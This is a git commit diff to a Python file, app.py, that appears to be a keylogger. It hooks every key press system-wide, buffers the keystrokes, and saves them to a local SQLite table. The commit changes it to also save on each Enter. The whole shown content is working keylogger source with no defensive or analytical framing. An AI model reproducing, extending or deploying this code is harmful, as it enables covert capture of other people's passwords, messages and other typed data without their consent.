05f5229d3a21d12cdf14ddbc504678f86f2fe26e
Kal-arcade <arkadkalliston21@gmail.com>
2025-02-17 18:18:20 -0300

    Update app.py

--- app.py
+++ app.py
@@ -8,14 +8,14 @@ cursor = conn.cursor()
 
 def eve(e):
     a = e.name
-    if len(lis) >= 80:
+    if len(lis) >= 80 or e.name == "enter":
         tec = ''.join(lis)
         cursor.execute("INSERT INTO digits (teclas) VALUES(?)", (tec,))
         conn.commit()
         lis.clear()
     elif e.name == "backspace" and len(lis) > 0:
         lis.pop()
-    elif e.name == "enter" or e.name == "space":
+    elif e.name == "space":
         lis.append(" ")
     elif e.name == "ctrl" or e.name == "shift" or e.name == "alt" or e.name == "tab":
         lis.append("")
@@ -24,4 +24,3 @@ def eve(e):
 
 keyboard.on_press(eve)
 keyboard.wait('esc')
-
